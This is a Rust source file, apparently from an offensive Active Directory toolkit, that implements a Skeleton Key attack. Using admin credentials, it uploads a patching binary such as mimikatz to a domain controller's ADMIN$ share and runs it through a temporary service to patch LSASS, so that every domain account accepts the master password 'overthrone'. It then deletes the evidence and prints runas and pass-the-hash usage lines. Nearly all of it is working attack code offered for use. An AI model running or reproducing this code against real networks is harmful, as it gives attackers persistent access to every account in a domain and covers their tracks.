//! Skeleton Key injection — patch LSASS on a DC to accept a master password.
//!
//! # Attack Details
//!
//! The Skeleton Key attack patches LSASS in-memory on a Domain Controller:
//! - Patches `msv1_0!MsvpPasswordValidate` (NTLM)
//! - Patches `kerberos!CDLocateCSystem` (Kerberos)
//! - After patching: ALL domain accounts accept BOTH real password AND master password
//! - Survives until DC reboot
//!
//! # Requirements
//!
//! - Domain Admin privileges (or equivalent with `SeDebugPrivilege`)
//! - `ForgeConfig.payload_path` pointing to a patching binary (e.g. mimikatz.exe)
//! - SMB write access to ADMIN$ on the DC
//!
//! # Execution Flow
//!
//! 1. Connect to DC via SMB using credentials from `ForgeConfig`
//! 2. Verify admin access (ADMIN$ / C$ writable)
//! 3. Upload payload binary to `ADMIN$\Temp\<random>.exe`
//! 4. Create a temporary service via SVCCTL to execute:
//!    `<payload> "privilege::debug" "misc::skeleton" "exit"`
//! 5. Wait for completion, capture output
//! 6. Delete uploaded binary and temp service

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::smb::SmbSession;
use tracing::{info, warn};

use crate::exec_util;
use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};

/// Inject a Skeleton Key into the target DC's LSASS process.
///
/// Connects to the DC via SMB, uploads the patching tool, executes it via a
/// temporary SVCCTL service, reads the output, and cleans up.
///
/// If `config.payload_path` is `None`, falls back to generating attack metadata
/// without execution (useful for dry-run / planning).
pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
    info!("[skeleton] Skeleton Key injection against {}", config.dc_ip);

    // Validate credentials
    let password = match (&config.password, &config.nt_hash) {
        (Some(pw), _) => pw.clone(),
        (None, Some(_hash)) => {
            // TODO: PTH authentication when SmbSession supports it
            return Err(OverthroneError::TicketForge(
                "Pass-the-hash SMB auth not yet implemented; supply a plaintext password".into(),
            ));
        }
        _ => {
            return Err(OverthroneError::TicketForge(
                "Credentials required for Skeleton Key injection".into(),
            ));
        }
    };

    let master_password = "overthrone";
    let master_hash = compute_skeleton_ntlm(master_password);

    info!(
        "[skeleton] Master password: '{}' (NTLM: {})",
        master_password,
        hex::encode(&master_hash)
    );

    // ── Step 1: Connect to DC via SMB ───────────────────────────
    info!("[skeleton] Connecting to {} via SMB", config.dc_ip);
    let smb = SmbSession::connect(&config.dc_ip, &config.domain, &config.username, &password)
        .await
        .map_err(|e| {
            OverthroneError::TicketForge(format!(
                "SMB connect to {} failed: {e}",
                config.dc_ip
            ))
        })?;

    // ── Step 2: Verify admin access ─────────────────────────────
    info!("[skeleton] Verifying admin access on {}", config.dc_ip);
    let admin_check = smb.check_admin_access().await;
    if !admin_check.has_admin {
        return Err(OverthroneError::TicketForge(format!(
            "No admin access on {} (shares: {:?}). DA/local admin required.",
            config.dc_ip, admin_check.accessible_shares
        )));
    }
    info!(
        "[skeleton] Admin access confirmed on {} ({:?})",
        config.dc_ip, admin_check.accessible_shares
    );

    // ── Step 3: Upload & execute payload, or dry-run ────────────
    let (output, executed) = match &config.payload_path {
        Some(payload_path) => {
            // Upload payload to ADMIN$\Temp\<random>.exe
            let remote_name = format!("Temp\\{:08x}.exe", rand::random::<u32>());
            info!("[skeleton] Uploading {} → ADMIN$\\{}", payload_path, remote_name);

            smb.upload_file(payload_path, "ADMIN$", &remote_name)
                .await
                .map_err(|e| {
                    OverthroneError::TicketForge(format!(
                        "Failed to upload payload to ADMIN$\\{}: {e}",
                        remote_name
                    ))
                })?;

            // Build command: payload "privilege::debug" "misc::skeleton" "exit"
            let win_path = format!("C:\\Windows\\{}", remote_name);
            let cmd = format!(
                "{} \"privilege::debug\" \"misc::skeleton\" \"exit\"",
                win_path
            );

            info!("[skeleton] Executing skeleton key command via SVCCTL");
            let out = exec_util::run_remote_command(&smb, &cmd).await.unwrap_or_else(|e| {
                warn!("[skeleton] Command execution returned error (may be normal): {e}");
                String::from("(no output captured)")
            });

            // Cleanup uploaded binary
            info!("[skeleton] Cleaning up uploaded payload");
            if let Err(e) = smb.delete_file("ADMIN$", &remote_name).await {
                warn!("[skeleton] Could not delete payload from ADMIN$\\{}: {e}", remote_name);
            }

            (out, true)
        }
        None => {
            warn!(
                "[skeleton] No payload_path specified — generating metadata only. \
                 Set config.payload_path to a patching binary (e.g. mimikatz.exe) for execution."
            );
            (String::new(), false)
        }
    };

    // ── Build result ────────────────────────────────────────────
    let cleanup_cmd = format!(
        "# Skeleton Key cleanup (requires DC reboot):\n\
         Restart-Computer -ComputerName {} -Force\n\
         # Or restart KDC (brief Kerberos outage):\n\
         Get-Service -ComputerName {} krbtgt | Restart-Service -Force",
        config.dc_ip, config.dc_ip
    );

    let details = if executed {
        format!(
            "Skeleton Key injected on {}:\n\
             - Master password: '{}'\n\
             - Master NTLM: {}\n\
             - Patches: msv1_0!MsvpPasswordValidate + kerberos!CDLocateCSystem\n\
             - All accounts accept both real password AND master password\n\
             - Survives until DC reboot\n\n\
             Execution output:\n{}\n\n\
             Usage:\n\
             - Any user: runas /user:{}\\AnyUser /netonly cmd (password: '{}')\n\
             - PtH: sekurlsa::pth /user:Administrator /domain:{} /ntlm:{}",
            config.dc_ip,
            master_password,
            hex::encode(&master_hash),
            output,
            config.domain,
            master_password,
            config.domain,
            hex::encode(&master_hash)
        )
    } else {
        format!(
            "Skeleton Key metadata (NOT EXECUTED — no payload_path):\n\
             - Target: {}\n\
             - Admin access: VERIFIED\n\
             - Master password: '{}'\n\
             - Master NTLM: {}\n\
             - To execute: set config.payload_path to a patching binary",
            config.dc_ip,
            master_password,
            hex::encode(&master_hash)
        )
    };

    Ok(ForgeResult {
        action: "Skeleton Key".into(),
        domain: config.domain.clone(),
        success: executed,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: "Skeleton Key (LSASS patch)".into(),
            target: config.dc_ip.clone(),
            success: executed,
            details,
            cleanup_command: Some(cleanup_cmd),
        }),
        message: if executed {
            format!(
                "Skeleton Key injected on {} — master password: '{}'",
                config.dc_ip, master_password
            )
        } else {
            format!(
                "Skeleton Key metadata generated for {} (payload_path not set)",
                config.dc_ip
            )
        },
    })
}

/// Compute NTLM hash of the skeleton master password.
fn compute_skeleton_ntlm(password: &str) -> Vec<u8> {
    use md4::{Digest, Md4};
    let utf16: Vec<u8> = password
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let mut hasher = Md4::new();
    hasher.update(&utf16);
    hasher.finalize().to_vec()
}
